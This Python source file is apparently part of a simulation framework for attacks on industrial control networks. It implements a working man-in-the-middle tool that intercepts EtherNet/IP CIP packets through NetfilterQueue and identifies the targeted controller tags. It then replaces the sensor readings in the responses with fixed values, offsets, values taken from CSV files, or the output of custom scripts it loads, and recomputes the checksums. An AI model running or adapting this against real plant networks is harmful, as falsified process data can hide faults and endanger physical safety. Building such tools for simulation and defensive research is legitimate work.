from wacsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path
import os
import sys
import csv
import importlib.util
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from wacsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload

def extract_tag_name(payload):
    """
    Extract tag name from a CIP Read/Write packet based on CIP path structure.

    CIP path starts after the service code and class/instance/attribute segments.
    Logical segment format:
    - Byte 0: segment type (usually 0x91 for symbolic segment)
    - Byte 1: number of 16-bit words (N)
    - Next N*2 bytes: ASCII tag name, padded if odd-length
    """
    try:
        for i in range(40, 80):  # scan likely region
            if payload[i] == 0x91:  # 0x91 = symbolic logical segment
                tag_len_words = payload[i + 1]
                tag_bytes = payload[i + 2 : i + 2 + tag_len_words * 2]
                tag = tag_bytes.decode("ascii", errors="ignore").rstrip("\x00").strip()
                tag = tag.split(":")[0]  # Drop CIP instance number

                return tag
        return ""
    except Exception as e:
        return ""


class MiTMNetfilterQueue(PacketQueue):

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int, queue_number: int):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)
        self.attacked_tags = self.intermediate_attack['tags']
        self.session_ids = []
        self.session_tags = dict()
        self.attacker_cache = dict()
        # Load CSV files
        self.csv_data = {}  # (tag, key) -> [float values]
        self.csv_index = {}  # (tag, key) -> int index
        for tag in self.attacked_tags:
            for key in ('value', 'offset'):
                val = tag.get(key)
                if isinstance(val, str) and val.endswith('.csv'):
                    try:
                        with open(val, 'r') as f:
                            reader = csv.reader(f)
                            values = [float(row[0]) for row in reader if row and row[0].replace('.', '', 1).isdigit()]
                            if not values:
                                self.logger.warning(f"CSV file {val} for tag {tag['tag']} is empty or invalid.")
                            self.csv_data[(tag['tag'], key)] = values
                            self.csv_index[(tag['tag'], key)] = 0
                            self.logger.debug(f"Loaded {len(values)} entries from {val} for {key} of tag {tag['tag']}")
                    except Exception as e:
                        self.logger.error(f"Failed to load {val} for tag {tag['tag']}: {e}")

    def get_next_csv_value(self, tag_name, key):
        values = self.csv_data.get((tag_name, key))
        if not values:
            return None
        index = self.csv_index[(tag_name, key)]
        value = values[index]
        # Loop
        self.csv_index[(tag_name, key)] = (index + 1) % len(values)
        self.logger.debug(f'Next value for {tag_name} ({key}): {value} (index: {self.csv_index[(tag_name, key)]})')
        return value

    def capture(self, packet):
        try:
            p = IP(packet.get_payload())
            if 'TCP' in p and Raw in p:
                payload = p[Raw].load
                # 🔹 Log raw payload for debugging
                # self.logger.debug(f"Captured packet raw payload: {payload.hex()}")

                this_session = int.from_bytes(payload[4:8], sys.byteorder)

                # 🔹 Dynamically extract tag name

                tag_name = extract_tag_name(payload)
                self.attacker_cache[tag_name] = translate_payload_to_float(payload)
                # Track session ID
                if len(p) > 105 and tag_name:
                    for tag in self.attacked_tags:
                        if tag_name == tag['tag']:
                            self.session_ids.append(this_session)
                            self.current_attacked_tag = tag
                            self.logger.debug(f"Session {this_session} mapped to tag {tag_name}")


                # Modify response packets
                elif len(p) == 102:
                    tag = None
                    if this_session in self.session_ids:
                        tag = self.current_attacked_tag
                    elif len(self.attacked_tags) > 0:
                        # Fallback for unidirectional interception (e.g. ICMP Redirect)
                        tag = self.attacked_tags[0]

                    if tag:
                        base_value = translate_payload_to_float(payload)
                        tag_name = tag['tag']
                        self.logger.debug(f"Tag name: {tag_name} | Value: {base_value} , | Target IP: {p[IP].dst}")

                        if 'value' in tag:
                            val = tag['value']
                            if isinstance(val, str) and val.endswith('.csv'):
                                modified_value = self.get_next_csv_value(tag_name, 'value')
                            else:
                                modified_value = val
                            p[Raw].load = translate_float_to_payload(modified_value, payload)

                        elif 'offset' in tag:
                            offset = tag['offset']
                            if isinstance(offset, str) and offset.endswith('.csv'):
                                offset = self.get_next_csv_value(tag_name, 'offset')
                            modified_value = base_value + offset
                            p[Raw].load = translate_float_to_payload(modified_value, payload)
                        elif 'custom' in tag:
                            path_to_algo = tag['custom']
                            ScriptName = path_to_algo.split('/')[-1]
                            spec = importlib.util.spec_from_file_location(ScriptName, path_to_algo)
                            module = importlib.util.module_from_spec(spec)
                            sys.modules[ScriptName] = module
                            spec.loader.exec_module(module)
                            AlgoRun = getattr(module, 'AlgoRun')
                            modified_value = AlgoRun(self.attacker_cache, tag_name) # Result is the sensor value
                            p[Raw].load = translate_float_to_payload(modified_value, payload)
                        # Recalculate checksums
                        del p[IP].chksum
                        del p[TCP].chksum

                        packet.set_payload(bytes(p))
                        self.logger.debug(f"Modified packet for tag '{tag_name}' with value {modified_value}")

            packet.accept()
        except Exception as exc:
            self.logger.error(f"Error processing packet: {exc}")
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)


def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start MITM attack NetfilterQueue')
    parser.add_argument(dest="intermediate_yaml",
                        help="Intermediate YAML file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate YAML",
                        type=int, metavar="N")
    parser.add_argument(dest="number", help="Number of the queue configured in IP Tables",
                        type=int, metavar="N")

    args = parser.parse_args()

    attack = MiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number=args.number
    )
    attack.main_loop()
